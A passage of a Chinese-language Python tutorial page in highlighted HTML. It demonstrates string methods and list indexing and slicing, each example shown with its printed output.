operator">=</span> <span class="token string">"This Is String Example...Wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>istitle<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"This is string example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>istitle<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"THIS IS STRING EXAMPLE....WOW!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"THIS is string example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span>s1 <span class="token operator">=</span> <span class="token string">"-"</span>s2 <span class="token operator">=</span> <span class="token string">""</span>seq <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">)</span>  <span class="token comment"># 字符串序列</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">.</span>join<span class="token punctuation">(</span>seq<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># r-u-n-o-o-b</span><span class="token keyword">print</span><span class="token punctuation">(</span>s2<span class="token punctuation">.</span>join<span class="token punctuation">(</span>seq<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># runoob</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 字符串长度</span><span class="token comment"># 6</span>l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 5</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"Runoob example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Runoob example....wow!!!**************************</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"Runoob EXAMPLE....WOW!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># runoob example....wow!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"     this is string example....wow!!!     "</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># this is string example....wow!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"88888888this is string example....wow!!!8888888"</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token string">'8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># this is string example....wow!!!8888888</span>intab <span class="token operator">=</span> <span class="token string">"aeiou"</span>outtab <span class="token operator">=</span> <span class="token string">"12345"</span>trantab <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>intab<span class="token punctuation">,</span> outtab<span class="token punctuation">)</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>translate<span class="token punctuation">(</span>trantab<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># th3s 3s str3ng 2x1mpl2....w4w!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"最大字符: "</span> <span class="token operator">+</span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 最大字符: u</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob"</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"最小字符: "</span> <span class="token operator">+</span> <span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 最小字符: b</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"www.w3cschool.cc"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"菜鸟教程旧地址："</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment"># 菜鸟教程旧地址： www.w3cschool.cc</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"菜鸟教程新地址："</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"w3cschool.cc"</span><span class="token punctuation">,</span> <span class="token string">"runoob.com"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 菜鸟教程新地址： www.runoob.com</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"is"</span><span class="token punctuation">,</span> <span class="token string">"was"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># thwas was string example....wow!!!</span>str1 <span class="token operator">=</span> <span class="token string">"this is really a string example....wow!!!"</span>str2 <span class="token operator">=</span> <span class="token string">"is"</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 5</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 5</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># -1</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>find<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 2</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>find<span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 2</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>find<span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># -1</span>str1 <span class="token operator">=</span> <span class="token string">"this is really a string example....wow!!!"</span>str2 <span class="token operator">=</span> <span class="token string">"is"</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>rindex<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 5</span><span class="token comment"># print (str1.rindex(str2,10))</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ******************this is string example....wow!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"     this is string example....wow!!!     "</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#      this is string example....wow!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"*****this is string example....wow!!!*****"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># *****this is string example....wow!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 以空格为分隔符</span><span class="token comment"># ['this', 'is', 'string', 'example....wow!!!']</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 以 i 为分隔符</span><span class="token comment"># ['th', 's is string example....wow!!!']</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 以 w 为分隔符</span><span class="token comment"># ['this is string example....', 'o', '!!!']</span>txt <span class="token operator">=</span> <span class="token string">"Google#Runoob#Taobao#Facebook"</span><span class="token comment"># 第二个参数为 1，返回两个参数列表</span>x <span class="token operator">=</span> txt<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment"># ['Google', 'Runoob#Taobao#Facebook']</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ab c\n\nde fg\rkl\r\n'</span><span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'ab c'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'de fg'</span><span class="token punctuation">,</span> <span class="token string">'kl'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ab c\n\nde fg\rkl\r\n'</span><span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ['ab c\n', '\n', 'de fg\r', 'kl\r\n']</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'this'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 字符串是否以 this 开头</span><span class="token comment"># True</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'string'</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 从第九个字符开始的字符串是否以 string 开头</span><span class="token comment"># True</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'this'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 从第2个字符开始到第四个字符结束的字符串是否以 this 开头</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"123abcrunoob321"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 字符序列为 12</span><span class="token comment"># 3abcrunoob3</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>swapcase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># THIS IS STRING EXAMPLE....WOW!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"This Is String Example....WOW!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>swapcase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># tHIS iS sTRING eXAMPLE....wow!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example from runoob....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># This Is String Example From Runoob....Wow!!!</span>txt <span class="token operator">=</span> <span class="token string">"hello b2b2b2 and 3g3g3g"</span>x <span class="token operator">=</span> txt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>  <span class="token comment"># 非字母后的第一个字母将转换为大写字母</span><span class="token comment"># Hello B2B2B2 And 3G3G3G</span>intab <span class="token operator">=</span> <span class="token string">"aeiou"</span>outtab <span class="token operator">=</span> <span class="token string">"12345"</span>trantab <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>intab<span class="token punctuation">,</span> outtab<span class="token punctuation">)</span>  <span class="token comment"># 制作翻译表</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>translate<span class="token punctuation">(</span>trantab<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># th3s 3s str3ng 2x1mpl2....w4w!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example from runoob....wow!!!"</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str.upper() : "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># str.upper() :  THIS IS STRING EXAMPLE FROM RUNOOB....WOW!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example from runoob....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str.zfill : "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># str.zfill :  this is string example from runoob....wow!!!</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str.zfill : "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># str.zfill :  000000this is string example from runoob....wow!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob2016"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isdecimal<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"23443434"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isdecimal<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span><span class="token triple-quoted-string string">'''str.capitalize() :  This is string example from runoob....wow!!!str.center(40, '*') :  ****************[runoob]****************str.count('o') :  3str.count('run', 0, 10) :  1菜鸟教程UTF-8 编码： b'\xe8\x8f\x9c\xe9\xb8\x9f\xe6\x95\x99\xe7\xa8\x8b'GBK 编码： b'\xb2\xcb\xc4\xf1\xbd\xcc\xb3\xcc'UTF-8 解码： 菜鸟教程GBK 解码： 菜鸟教程TrueTrueFalseFalse原始字符串: runoob12345abc替换 \t 符号: runoob  12345   abc使用 2 个空格替换 \t 符号: runoob  12345 abc使用 3 个空格: runoob   12345 abc使用 4 个空格: runoob  12345   abc使用 5 个空格: runoob    12345     abc使用 6 个空格: runoob      12345 abc77-177TrueFalseTrueTrueFalseTrueFalseFalseTrueFalseTrueTrueFalseTrueFalseTrueFalser-u-n-o-o-brunoob65Runoob example....wow!!!**************************runoob example....wow!!!this is string example....wow!!!     this is string example....wow!!!8888888th3s 3s str3ng 2x1mpl2....w4w!!!最大字符: u最小字符: b菜鸟教程旧地址： www.w3cschool.cc菜鸟教程新地址： www.runoob.comthwas was string example....wow!!!55-122-15******************this is string example....wow!!!     this is string example....wow!!!*****this is string example....wow!!!['this', 'is', 'string', 'example....wow!!!']['th', 's is string example....wow!!!']['this is string example....', 'o', '!!!']['Google', 'Runoob#Taobao#Facebook']['ab c', '', 'de fg', 'kl']['ab c\n', '\n', 'de fg\r', 'kl\r\n']TrueTrueFalse3abcrunoob3THIS IS STRING EXAMPLE....WOW!!!tHIS iS sTRING eXAMPLE....wow!!!This Is String Example From Runoob....Wow!!!Hello B2B2B2 And 3G3G3Gth3s 3s str3ng 2x1mpl2....w4w!!!str.upper() :  THIS IS STRING EXAMPLE FROM RUNOOB....WOW!!!str.zfill :  this is string example from runoob....wow!!!str.zfill :  000000this is string example from runoob....wow!!!FalseTrue'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><ol><li>索引截取方式与元组相同</li><li>截取后成为一个新列表</li><li>元素在打方括号中，以逗号分隔</li><li>列表的元素可改变</li><li>元素可以是元组</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">999</span><span class="token punctuation">]</span>list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>  <span class="token comment"># 输出完整列表</span><span class="token comment"># ['test', 1, 1.2, 999]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出列表第一个元素</span><span class="token comment"># test</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 从第二个开始输出到第三个元素</span><span class="token comment"># [1, 1.2]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出从第三个元素开始的所有元素</span><span class="token comment"># [1.2, 999]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list2 <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># 输出两次列表</span><span class="token comment"># [1, 'test', 1, 'test']</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span> <span class="token operator">+</span> list2<span class="token punctuation">)</span>  <span class="token comment"># 连接列表</span><span class="token comment"># ['test', 1, 1.2, 999, 1, 'test']</span>list3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token comment"># [1, 2, 3, 4, 5]</span>list3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'test'</span>  <span class="token comment"># 修改第一元素</span><span class="token keyword">print</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token comment"># ['test', 2, 3, 4, 5]</span>list3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">]</span>  <span class="token comment"># 修改第三个到第四元素</span><span class="token keyword">print</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token comment"># ['test', 2, 22, 33, 5]</span>list4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list4<span class="token punctuation">)</span><span class="token comment"># [1, 2, 3, 4, 5]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list4<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token comment"># 第一个-1表示从最后一个开始</span><span class="token comment"># 中间为空表示移动到列表末,最后一个-1为步长,-表示逆向</span><span class="token keyword">print</span><span class="token punctuation">(</span>list4<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># [4, 3, 2]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list4<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># [5]</span><span class="token triple-quoted-string string">'''['test', 1, 1.2, 999]test[1, 1.2][1.2, 999][1, 'test', 1, 'test']['test', 1, 1.2, 999, 1, 'test'][1, 2, 3, 4, 5]['test', 2, 3, 4, 5]['test', 2, 22, 33, 5][1, 2, 3, 4, 5][5, 4, 3, 2, 1][4, 3, 2][5]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="更新和删除元素"><a href="#更新和删除元素" class="headerlink" title="更新和删除元素"></a>更新和删除元素</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">list5 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list5<span class="token punctuation">)</span>list5<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'restart'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list5<span class="token punctuation">)</span>  <span class="token comment"># 在末尾添加元素</span><span class="token keyword">del</span> list5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>  <span class="token comment"># 删除第三个元素</span><span class="token keyword">print</span><span class="token 